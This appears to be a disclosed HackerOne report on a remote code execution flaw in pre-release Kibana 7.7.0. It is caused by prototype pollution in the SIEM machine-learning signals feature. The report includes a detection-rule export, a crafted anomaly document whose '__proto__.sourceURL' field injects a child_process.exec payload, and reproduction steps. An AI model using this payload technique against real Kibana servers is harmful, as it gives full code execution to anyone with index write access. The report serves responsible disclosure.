# Remote Code Execution in coming Kibana 7.7.0

## Report Details
- **Report ID**: 861744
- **URL**: https://hackerone.com/reports/861744
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-28T19:28:40.828Z
- **Disclosed**: 2021-04-19T21:46:03.513Z

## Reporter
- **Username**: alexbrasetvik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
**Summary:**

Kibana 7.7.0 as per commit [c5f682cb](https://github.com/elastic/kibana/commits/c5f682cb) is vulnerable to a remote code execution vulnerability that is similar to the one reported in https://hackerone.com/reports/852613

Kibana 7.7.0 is not released, so this is an experiment. I know that getting these reports is more valuable to Elastic prior to a release, as the amount of work growing out of a critical vulnerability like this is a lot more _after_ release. It could possibly be more valuable for me to wait until Cloud actually has the release and clearly is in scope, but I have faith in you wanting to encourage people to actually look at code whose release is imminent, so here's the report pre release.

I saw that you have commited the fixes to my previous report: https://github.com/elastic/kibana/commit/68674568efac9070935f07e55dfd1a9f8482663d That fix is part of commit c5f682cb which the following is tested with.

**Description:**

There is a prototype pollution in the new "SIEM signal" feature: https://github.com/elastic/kibana/blob/master/x-pack/plugins/siem/server/lib/detection_engine/signals/bulk_create_ml_signals.ts#L58

The attached recording shows how to exercise this code via a SIEM detection rule. The following JSON-blob is an export of the detection rule used:

```
{"actions":[],"created_at":"2020-04-28T17:19:42.955Z","updated_at":"2020-04-28T18:02:32.489Z","created_by":"elastic","description":"test","enabled":true,"anomaly_threshold":0,"false_positives":[],"from":"now-108015s","id":"ac26797b-9061-485c-889c-79993ca8e209","immutable":false,"interval":"15s","rule_id":"2a5a3f8e-79a9-4101-99d9-b414ed48c0db","output_index":".siem-signals-default","max_signals":100,"machine_learning_job_id":"linux_anomalous_network_activity_ecs","risk_score":50,"name":"test","references":[],"meta":{"from":"30h","kibana_siem_app_url":"https://localhost:5601/app/siem"},"severity":"low","updated_by":"elastic","tags":[],"to":"now","type":"machine_learning","threat":[],"throttle":"no_actions","version":3}
{"exported_count":1,"missing_rules":[],"missing_rules_count":0}
```

If I create a fake ML-anomaly like follows, I can pollute the prototype:

```
PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh
{
  "timestamp": 1588093630045,
  "result_type": "record",
  "record_score": 1,
  "job_id": "linux_anomalous_network_activity_ecs",
  "by_field_name": "field_name",
  "by_field_value": "field_value",
  "influencers": [
    {"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}
    ]
}
```

Note that the timestamp might need adjusting, as the SIEM rule only looks 30h back in the past as provided.

## Steps To Reproduce:

  1. Import the provided SIEM detection rule.
  1. Create the fake anomaly provided above.
  1. Enable the rule. Sometimes disabling and re-enabling it is necessary, which is probably a bug in itself.
  1. Wait ~15 seconds for the rule to be evaluated, which should execute the code, which on a Mac will cause "pwned" to sound and the youtube clip to open.

## Supporting Material/References:

  * Video walkthrough attached.

## Impact

A user with write access to these indexes (like any Cloud user would have) can achieve full remote code execution.

## Attachments
- Kibana_7.7.0_RCE.mp4
